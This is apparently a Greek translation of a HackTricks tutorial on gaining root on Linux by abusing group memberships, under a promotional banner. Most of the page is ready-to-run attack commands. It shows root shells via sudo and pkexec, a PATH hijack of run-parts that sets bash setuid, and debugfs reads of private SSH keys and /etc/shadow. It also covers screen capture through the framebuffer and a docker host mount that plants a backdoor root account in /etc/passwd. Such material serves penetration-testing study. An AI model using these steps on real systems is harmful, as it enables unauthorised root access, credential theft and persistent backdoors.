# Ενδιαφέρουσες Ομάδες - Ανύψωση Δικαιωμάτων στο Linux

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

## Ομάδες Sudo/Admin

### **PE - Μέθοδος 1**

**Μερικές φορές**, **από προεπιλογή (ή επειδή κάποιο λογισμικό το απαιτεί)** μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε μερικές από αυτές τις γραμμές:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης που ανήκει στην ομάδα sudo ή admin μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Αν αυτό ισχύει, για **να γίνετε ροοτ μπορείτε απλά να εκτελέσετε**:
```
sudo su
```
### Μέθοδος PE 2

Βρείτε όλα τα suid δυαδικά και ελέγξτε αν υπάρχει το δυαδικό **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Αν ανακαλύψετε ότι το δυαδικό **pkexec είναι ένα SUID δυαδικό** και ανήκετε στα **sudo** ή **admin**, μπορείτε πιθανόν να εκτελέσετε δυαδικά ως sudo χρησιμοποιώντας το `pkexec`.\
Αυτό συμβαίνει επειδή συνήθως αυτές είναι οι ομάδες μέσα στην **πολιτική polkit**. Αυτή η πολιτική αναγνωρίζει βασικά ποιες ομάδες μπορούν να χρησιμοποιήσουν το `pkexec`. Ελέγξτε το με:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Εκεί θα βρείτε ποιες ομάδες έχουν το δικαίωμα να εκτελέσουν το **pkexec** και **από προεπιλογή** σε μερικές διανομές Linux εμφανίζονται οι ομάδες **sudo** και **admin**.

Για **να γίνετε ροοτ μπορείτε να εκτελέσετε**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Εάν προσπαθήσετε να εκτελέσετε το **pkexec** και λάβετε αυτό το **σφάλμα**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Δεν είναι επειδή δεν έχετε δικαιώματα αλλά επειδή δεν είστε συνδεδεμένοι χωρίς γραφικό περιβάλλον**. Και υπάρχει μια λύση για αυτό το πρόβλημα εδώ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Χρειάζεστε **2 διαφορετικές συνεδρίες ssh**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Ομάδα Wheel

**Μερικές φορές**, **από προεπιλογή** μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε αυτήν τη γραμμή:
```
%wheel	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης που ανήκει στην ομάδα wheel μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Αν αυτό ισχύει, **για να γίνετε root μπορείτε απλά να εκτελέσετε**:
```
sudo su
```
## Ομάδα Shadow

Οι χρήστες από την **ομάδα shadow** μπορούν να **διαβάσουν** το αρχείο **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Λοιπόν, διαβάστε το αρχείο και προσπαθήστε να **αποκρυπτογραφήσετε μερικά hashes**.

## Ομάδα Προσωπικού

**staff**: Επιτρέπει στους χρήστες να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς την ανάγκη ριζικών δικαιωμάτων (σημειώστε ότι τα εκτελέσιμα στο `/usr/local/bin` βρίσκονται στη μεταβλητή PATH οποιουδήποτε χρήστη, και μπορεί να "αντικαταστήσουν" τα εκτελέσιμα στο `/bin` και `/usr/bin` με το ίδιο όνομα). Συγκρίνετε με την ομάδα "adm", η οποία σχετίζεται περισσότερο με την παρακολούθηση/ασφάλεια. [\[πηγή\]](https://wiki.debian.org/SystemGroups)

Στις διανομές debian, η μεταβλητή `$PATH` δείχνει ότι το `/usr/local/` θα εκτελεστεί με την υψηλότερη προτεραιότητα, είτε είστε προνομιούχος χρήστης είτε όχι.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Αν μπορούμε να απαγάγουμε ορισμένα προγράμματα στο `/usr/local`, μπορούμε εύκολα να αποκτήσουμε root πρόσβαση.

Η απαγωγή του προγράμματος `run-parts` είναι ένας εύκολος τρόπος για να αποκτήσουμε root πρόσβαση, επειδή τα περισσότερα προγράμματα θα εκτελέσουν ένα `run-parts` όπως (crontab, όταν συνδεθείτε μέσω ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ή Όταν γίνεται νέα σύνδεση στη συνεδρία ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Εκμετάλλευση**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Ομάδα Δίσκου

Αυτό το προνόμιο είναι σχεδόν **ισοδύναμο με τη ριζική πρόσβαση** καθώς μπορείτε να έχετε πρόσβαση σε Ͽλα τα δεδομένα μέσα στη μηχανή.

Αρχεία: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Σημειώστε ότι χρησιμοποιώντας το debugfs μπορείτε επίσης να **εγγράψετε αρχεία**. Για παράδειγμα, για να αντιγράψετε το `/tmp/asd1.txt` στο `/tmp/asd2.txt` μπορείτε να κάνετε:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ωστόσο, αν προσπαθήσετε να **εγγράψετε αρχεία που ανήκουν στο χρήστη root** (όπως `/etc/shadow` ή `/etc/passwd`) θα λάβετε ένα σφάλμα "**Άρνηση πρόσβασης**".

## Ομάδα Video

Χρησιμοποιώντας την εντολή `w` μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανίσει ένα αποτέλεσμα όπως το παρακάτω:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Το **tty1** σημαίνει ότι ο χρήστης **yossi είναι συνδεδεμένος φυσικά** σε ένα τερματικό στη συσκευή.

Η ομάδα **video** έχει πρόσβαση για να δει την οθόνη εξόδου. Βασικά μπορείτε να παρατηρήσετε τις οθόνες. Για να το κάνετε αυτό, χρειάζεται να **αποκτήσετε την τρέχουσα εικόνα στην οθόνη** σε ωμά δεδομένα και να πάρετε την ανάλυση που χρησιμοποιεί η οθόνη. Τα δεδομένα της οθόνης μπορούν να αποθηκευτούν στο `/dev/fb0` και μπορείτε να βρείτε την ανάλυση αυτής της οθόνης στο `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Για να **ανοίξετε** την **ακατέργαστη εικόνα** μπορείτε να χρησιμοποιήσετε το **GIMP**, επιλέξτε το αρχείο \*\*`screen.raw` \*\* και επιλέξτε ως τύπο αρχείου **Raw image data**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Στη συνέχεια τροποποιήστε το Πλάτος και το Ύψος στις τιμές που χρησιμοποιούνται στην οθόνη και ελέγξτε διαφορετικούς Τύπους Εικόνας (και επιλέξτε αυτόν που εμφανίζει καλύτερα την οθόνη):

![](<../../../.gitbook/assets/image (288).png>)

## Root Group

Φαίνεται ότι από προεπιλογή τα **μέλη της ομάδας root** μπορεί να έχουν πρόσβαση για **τροποποίηση** ορισμένων αρχείων ρυθμίσεων **υπηρεσιών** ή ορισμένων αρχείων **βιβλιοθηκών** ή **άλλων ενδιαφερουσών πραγμάτων** που θα μπορούσαν να χρησιμοποιηθούν για την ανάδειξη προνομίων...

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Ομάδα Docker

Μπορείτε **να προσαρτήσετε το σύστημα αρχείων ρίζας του κεντρικού υπολογιστή σε έναν όγκο της μηχανής**, έτσι ώστε όταν η μηχανή ξεκινά, φορτώνει αμέσως ένα `chroot` σε αυτόν τον όγκο. Αυτό σας δίνει αποτελεσματικά root στη μηχανή.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## Ομάδα lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Ομάδα Adm

Συνήθως τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα να **διαβάζουν αρχεία καταγραφής** που βρίσκονται μέσα στον φάκελο _/var/log/_.\
Επομένως, αν έχετε μολυνθεί έναν χρήστη μέσα σε αυτή την ομάδα, οπωσδήποτε θα πρέπει να **ελέγξετε τα αρχεία καταγραφής**.

## Ομάδα Auth

Στο OpenBSD η ομάδα **auth** συνήθως μπορεί να γράψει στους φακέλους _**/etc/skey**_ και _**/var/db/yubikey**_ αν χρησιμοποιούνται.\
Αυτά τα δικαιώματα μπορούν να καταχραστούν με τον παρακάτω εκμεταλλευτή για **εξώθηση προνομίων** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
